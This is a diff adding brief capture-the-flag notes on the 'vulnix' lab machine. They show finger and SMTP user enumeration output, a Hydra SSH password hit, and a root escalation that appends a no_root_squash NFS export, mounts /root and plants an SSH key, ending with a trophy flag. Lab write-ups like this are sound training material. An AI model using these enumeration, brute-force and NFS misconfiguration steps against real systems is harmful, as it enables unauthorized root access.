@@ -1,0 +1,52 @@
+Inside Finger (port 79)
+	Login: root           			Name: root
+	Directory: /root                    	Shell: /bin/bash
+	Never logged in.
+
+	Login: vulnix         			Name: 
+	Directory: /home/vulnix             	Shell: /bin/bash
+	Never logged in.
+
+With 25
+	
+	######## Scan started at Sat May 18 13:25:36 2019 #########
+	192.168.0.71: ROOT exists
+	192.168.0.71: backup exists
+	192.168.0.71: bin exists
+	192.168.0.71: daemon exists
+	192.168.0.71: games exists
+	192.168.0.71: gnats exists
+	192.168.0.71: irc exists
+	192.168.0.71: libuuid exists
+	192.168.0.71: lp exists
+	192.168.0.71: list exists
+	192.168.0.71: mail exists
+	192.168.0.71: man exists
+	192.168.0.71: messagebus exists
+	192.168.0.71: news exists
+	192.168.0.71: nobody exists
+	192.168.0.71: postmaster exists
+	192.168.0.71: proxy exists
+	192.168.0.71: root exists
+	192.168.0.71: sshd exists
+	192.168.0.71: sys exists
+	192.168.0.71: syslog exists
+	192.168.0.71: sync exists
+	192.168.0.71: user exists
+	192.168.0.71: uucp exists
+	192.168.0.71: www-data exists
+	######## Scan completed at Sat May 18 13:25:36 2019 #########
+
+Using Hydra
+	ACCOUNT FOUND: [ssh] Host: 192.168.0.71 User: user Password: letmein [SUCCESS]
+
+accessind nfs share and add ssh key to access vulnix
+
+we can do sudoedit /etc/exports
+	so append /root/ *(no_root_squash,insecure,rw)
+	and mount /root/ folder into our pc
+
+=> mount -t nfs vulnix.ck:/root /temp/
+**********************************************************************
+root@vulnix:~# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
